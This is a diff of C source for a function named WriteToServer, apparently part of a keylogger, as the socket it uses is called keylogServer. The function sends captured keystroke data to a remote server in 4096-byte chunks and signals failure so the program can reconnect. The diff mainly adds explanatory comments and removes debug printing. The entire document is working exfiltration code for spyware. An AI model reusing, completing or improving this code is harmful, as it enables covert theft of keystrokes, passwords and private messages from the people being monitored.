@@ -113,25 +113,46 @@ bool WriteToServer(const char* buffer)
 
                 }
            /*
+              if the remaining buffer is less then 4096 bytes then transmit the entire buffer. to the server 
            */
             else
                 {
-
+                    /*
+                      zero out the temp buffer 
+                    */
                     memset(temp,0,0x1000);
+                   /*
+                     coppy the buffer data over to the temp buffer.
+                   */
                     memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
+                    /*
+                     attempt to send the data from temp out to the server if this fails return false
+                    */
                     if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                         return false;
-                    printf("%s",temp);
+                    /*
+                      the data was successfully sent and the socket is still open, return true. 
+                    */
                     return true;
                 }
-            printf("%s",temp);
+           
         }
     }
+   /*
+     if the originating buffer is less then 4096 bytes attempt to send the buffer in its entirerty
+   */
     else
     {
+     /* 
+       if the socket has failed or the data was not sent properly then return false so this program can 
+       attempt to re-establish a connection.
+     */
     if (send(keylogServer,buffer,strlen(buffer)+1,0) ==SOCKET_ERROR)
         return false;
     }
+    /* 
+      all is good with the world, return true the data has been sent successfully
+    */
     return true;
 }
 
